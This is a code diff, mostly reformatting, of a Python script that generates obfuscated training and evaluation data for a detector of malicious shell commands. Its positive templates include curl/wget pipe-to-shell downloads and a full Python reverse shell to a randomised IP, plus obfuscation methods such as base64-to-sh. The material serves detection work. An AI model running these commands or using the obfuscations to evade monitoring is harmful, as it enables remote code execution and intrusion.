@@ -14,13 +14,13 @@ Training rows are APPENDED to a copy of the v4 corpus (no v4 file is touched);
 all generated rows carry family_id="family:obf-<variant>-<seed>" so the eval
 families are disjoint from the training families by construction.
 """
+
 from __future__ import annotations
 
 import argparse
 import hashlib
 import json
 import random
-import string
 from pathlib import Path
 
 ROOT = Path(__file__).resolve().parents[1]
@@ -72,7 +72,10 @@ POS_BASE = [
     ("curl -sL http://{host}/a.sh | bash", ["TA0011"]),
     ("wget -qO- http://{host}/i.sh | sh", ["TA0011"]),
     ("curl -s http://{host}/x -o /tmp/x && chmod +x /tmp/x && /tmp/x", ["TA0011"]),
-    ("python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", ["TA0011"]),
+    (
+        'python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',  # noqa: E501
+        ["TA0011"],
+    ),
 ]
 
 # benign minimal pairs: same verbs, safe targets
@@ -95,6 +98,7 @@ BENIGN_BASE = [
     "curl -s https://example.com/a.txt -o /tmp/a.txt",
     "python3 -c 'print(1)'",
 ]
+
 
 # ------------------------------------------------------------- obfuscation
 def case_mix(s: str, rng: random.Random) -> str:
@@ -169,27 +173,43 @@ def obfuscate(s: str, method: str, rng: random.Random) -> str:
         return s.replace("/", "//", 1)
     if method == "base64_sh":
         import base64
+
         payload = base64.b64encode(s.encode()).decode()
         return f"echo {payload} | base64 -d | sh"
     raise ValueError(method)
 
 
 TRAIN_METHODS = [
-    "quote_join", "backslash_hex_first", "ansi_c_first", "case_mix",
-    "busybox", "toybox_sh_c", "subs_echo_first", "ifs", "env",
+    "quote_join",
+    "backslash_hex_first",
+    "ansi_c_first",
+    "case_mix",
+    "busybox",
+    "toybox_sh_c",
+    "subs_echo_first",
+    "ifs",
+    "env",
 ]
 EVAL_METHODS = [
-    "octal_first", "backtick_echo_first", "base64_sh", "sh_c", "bash_c",
-    "path_dot", "path_double", "busybox", "case_mix", "quote_join",
+    "octal_first",
+    "backtick_echo_first",
+    "base64_sh",
+    "sh_c",
+    "bash_c",
+    "path_dot",
+    "path_double",
+    "busybox",
+    "case_mix",
+    "quote_join",
 ]
+
 
 # ---------------------------------------------------------------- builders
 def fill(s: str, rng: random.Random) -> str:
     ip = f"45.33.{rng.randint(1, 250)}.{rng.randint(1, 250)}"
     port = rng.choice(["4444", "8080", "31337", "1337", "5555"])
     dev = rng.choice("abcdefgh").upper()
-    s = (s.replace("{ip}", ip).replace("{port}", port)
-          .replace("{host}", ip))
+    s = s.replace("{ip}", ip).replace("{port}", port).replace("{host}", ip)
     if "/dev/sdX" in s or "/dev/sda" in s or "/dev/sdb" in s:
         s = s.replace("/dev/sda", f"/dev/sd{dev.lower()}")
         s = s.replace("/dev/sdb", f"/dev/sd{dev.lower()}")
@@ -229,8 +249,17 @@ def session(cmd: str, label: str, family: str, kind: str, dts=None):
     }
 
 
-def render(*, out_dir: Path, rng: random.Random, methods, family_stem: str,
-           n_pos: int, n_ben: int, split: str, label_prefix: str = "") -> list[dict]:
+def render(
+    *,
+    out_dir: Path,
+    rng: random.Random,
+    methods,
+    family_stem: str,
+    n_pos: int,
+    n_ben: int,
+    split: str,
+    label_prefix: str = "",
+) -> list[dict]:
     rows = []
     seen = set()
     pos_count = ben_count = 0
@@ -255,7 +284,7 @@ def render(*, out_dir: Path, rng: random.Random, methods, family_stem: str,
                     else:
                         base = base + "-" + suffix
                 elif tail.isdigit():
-                    base = base[:-len(tail)] + str(rng.randint(1000, 65000))
+                    base = base[: -len(tail)] + str(rng.randint(1000, 65000))
                 else:
                     base = base + "-" + suffix
             elif tail.startswith(chr(39)) and tail.endswith(chr(39)):
@@ -270,8 +299,7 @@ def render(*, out_dir: Path, rng: random.Random, methods, family_stem: str,
         if key in seen:
             continue
         seen.add(key)
-        row = session(cmd, "pos" if lbl == "pos" else "ben", family,
-                      "synthetic_aug_obf")
+        row = session(cmd, "pos" if lbl == "pos" else "ben", family, "synthetic_aug_obf")
         if lbl == "pos":
             pos_count += 1
             for t in tactics:
@@ -303,13 +331,19 @@ def main() -> int:
 
     # --- training augmentation (families never reused in eval) ----------
     rng = random.Random(args.seed)
-    train_rows = render(out_dir=out, rng=rng, methods=TRAIN_METHODS,
-                        family_stem=f"train-{args.seed}", n_pos=args.train_pos,
-                        n_ben=args.train_ben, split="train")
+    train_rows = render(
+        out_dir=out,
+        rng=rng,
+        methods=TRAIN_METHODS,
+        family_stem=f"train-{args.seed}",
+        n_pos=args.train_pos,
+        n_ben=args.train_ben,
+        split="train",
+    )
 
     # append additive copy of v4 train (never edit originals)
     v4_train = ROOT / "data/processed/v4/train.jsonl"
-    base_rows = [json.loads(l) for l in v4_train.open() if l.strip()]
+    base_rows = [json.loads(row_line) for row_line in v4_train.open() if row_line.strip()]
     with (out / "train.jsonl").open("w") as f:
         for r in base_rows + train_rows:
             r["split"] = "train"
@@ -321,31 +355,48 @@ def main() -> int:
 
     # --- eval slices ----------------------------------------------------
     rng_c = random.Random(args.seed + 1)
-    canon = render(out_dir=evals, rng=rng_c, methods=["plain"],
-                   family_stem=f"eval-canon-{args.seed}", n_pos=args.eval_canon_pos,
-                   n_ben=0, split="test")
+    canon = render(
+        out_dir=evals,
+        rng=rng_c,
+        methods=["plain"],
+        family_stem=f"eval-canon-{args.seed}",
+        n_pos=args.eval_canon_pos,
+        n_ben=0,
+        split="test",
+    )
     with (evals / "critical_singles_eval.jsonl").open("w") as f:
         for r in canon:
             f.write(json.dumps(r, sort_keys=True) + "\n")
 
     rng_o = random.Random(args.seed + 2)
-    obf = render(out_dir=evals, rng=rng_o, methods=EVAL_METHODS,
-                 family_stem=f"eval-obf-{args.seed}", n_pos=args.eval_obf_pos,
-                 n_ben=0, split="test")
+    obf = render(
+        out_dir=evals,
+        rng=rng_o,
+        methods=EVAL_METHODS,
+        family_stem=f"eval-obf-{args.seed}",
+        n_pos=args.eval_obf_pos,
+        n_ben=0,
+        split="test",
+    )
     with (evals / "obfuscation_eval.jsonl").open("w") as f:
         for r in obf:
             f.write(json.dumps(r, sort_keys=True) + "\n")
 
     rng_b = random.Random(args.seed + 3)
-    ben = render(out_dir=evals, rng=rng_b, methods=["plain"],
-                 family_stem=f"eval-ben-{args.seed}", n_pos=0,
-                 n_ben=args.eval_ben, split="test")
+    ben = render(
+        out_dir=evals,
+        rng=rng_b,
+        methods=["plain"],
+        family_stem=f"eval-ben-{args.seed}",
+        n_pos=0,
+        n_ben=args.eval_ben,
+        split="test",
+    )
     with (evals / "benign_twins_eval.jsonl").open("w") as f:
         for r in ben:
             f.write(json.dumps(r, sort_keys=True) + "\n")
 
-    print(f"train.jsonl rows = {len(base_rows) + len(train_rows)} "
-          f"(+{len(train_rows)} obf aug)")
+    print(f"train.jsonl rows = {len(base_rows) + len(train_rows)} (+{len(train_rows)} obf aug)")
     print(f"critical_singles_eval = {len(canon)}")
     print(f"obfuscation_eval      = {len(obf)}")
     print(f"benign_twins_eval     = {len(ben)}")
